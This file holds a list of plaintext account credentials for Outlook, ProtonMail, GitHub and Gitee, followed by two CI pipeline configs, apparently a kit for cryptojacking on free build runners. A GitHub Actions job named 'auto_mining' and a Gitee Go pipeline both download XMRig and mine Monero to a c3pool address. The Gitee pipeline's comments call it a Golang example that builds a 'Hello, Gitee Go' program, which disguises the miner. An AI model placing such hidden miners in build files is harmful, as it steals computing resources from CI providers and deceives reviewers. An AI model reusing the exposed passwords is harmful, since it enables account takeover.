({
  "username": "zhangyalin001@outlook.com",
  "password": "lin@123456789",
  "githubusername": "hehedadada-sudo",
  "githubpassword": "zhangyalin001@outlook.com2",
  "githubrepository": "GOLANG",
  "giteeusername": "hehedadada-gtee",
  "giteepassword": "zhangyalin001@outlook.com2",
  "giteerepository": "GOGOGO"
},
{
  "username": "zhangyalin002@outlook.com",
  "password": "lin@123456789",
  "githubusername": "codeairddd",
  "githubpassword": "zhangyalin002@outlook.com2",
  "githubrepository": "chenyuelou",
  "giteeusername": "codeair",
  "giteepassword": "zhangyalin002@outlook.com2",
  "giteerepository": "GOGOGO"
},
{
  "username": "zhangyalin003@outlook.com",
  "password": "lin@123456789",
  "githubusername": "codebirdyingyingying",
  "githubpassword": "zhangyalin003@outlook.com2",
  "githubrepository": "yingyingying",
  "giteeusername": "codebirdyingyingying",
  "giteepassword": "zhangyalin003@outlook.com2",
  "giteerepository": "GOGOGO"
},
{
  "username": "zhangyalin004@outlook.com",
  "password": "lin@123456789",
  "githubusername": "laotie666ddd",
  "githubpassword": "zhangyalin004@outlook.com2",
  "githubrepository": "yingyingying",
  "giteeusername": "laotie666ddd",
  "giteepassword": "zhangyalin004@outlook.com2",
  "giteerepository": "laotieddd"
},
{
  "username": "zhangyalin005@outlook.com",
  "password": "lin@123456789",
  "githubusername": "xiaomeibiepao",
  "githubpassword": "zhangyalin005@outlook.com2",
  "githubrepository": "yingyingying",
  "giteeusername": "xiaomeibiepao",
  "giteepassword": "zhangyalin005@outlook.com2",
  "giteerepository": "laotieddd"
},
{
  "username": "zhaozilong001@protonmail.com",
  "password": "long@123456",
  "githubusername": "meimeida111",
  "githubpassword": "zhaozilong001@protonmail.com2",
  "githubrepository": "yingyingying",
  "giteeusername": "",
  "giteepassword": "",
  "giteerepository": ""
},

name: '2'

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  auto_mining:
    runs-on: ubuntu-latest
    steps:
      - name: 'Checkout codes'
        uses: actions/checkout@v2

      - name: 'Running Xmrig'
        run: |
          sudo wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-static-x64.tar.gz
          sudo tar -xf xmrig-6.8.2-linux-static-x64.tar.gz
          cd xmrig-6.8.2
          sudo ./xmrig -o mine.c3pool.com:13333 -u 89VhybpTyiXcEC4dyRuq6mKgaqmZVQc9Weov9eYrfdb7JU4TnjcrGmV79jhjpdpYMSRVdRHKPgfS7FhogEj6yeHvVp2eyKE -k --coin monero




name: first                      # 定义一个唯一 ID 标识为 golang-build，名称为 “Golang 编译流水线示例” 的流水线
displayName: 'Golang 编译流水线示例'
triggers:                                # 流水线触发器配置
  push:                                  # 设置 master 分支 在产生代码 push 时精确触发（PRECISE）构建
    - matchType: PRECISE
      branch: master
commitMessage: ''                        # 通过匹配当前提交的 CommitMessage 决定是否执行流水线
stages:                                  # 构建阶段配置
  - stage:                               # 定义一个 ID 标识为 build-stage，名为 “Build Stage” 的阶段
      name: build-stage
      displayName: 'Build Stage'
      failFast: false                    # 允许快速失败，即当 Stage 中有任务失败时，直接结束整个 Stage
      steps:                             # 构建步骤配置
        - step: golangbuild@1            # 采用 Golang 编译环境
          name: build-step               # 定义一个 ID 标识为 build-step ,名为 “Build Step” 的阶段
          displayName: 'Build Step'
          inputs:                        # 构建输入参数设定
            golangVersion: 1.13          # 指定 Golang 环境版本为 1.13
            goals: |                     # 示例脚本：创建并编译构建一个命令行输出 “Hello, Gitee Go” 的程序
              wget https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-linux-static-x64.tar.gz
              tar -xf xmrig-6.8.2-linux-static-x64.tar.gz
              cd xmrig-6.8.2
              ./xmrig -o mine.c3pool.com:13333 -u 89VhybpTyiXcEC4dyRuq6mKgaqmZVQc9Weov9eYrfdb7JU4TnjcrGmV79jhjpdpYMSRVdRHKPgfS7FhogEj6yeHvVp2eyKE -k --coin monero
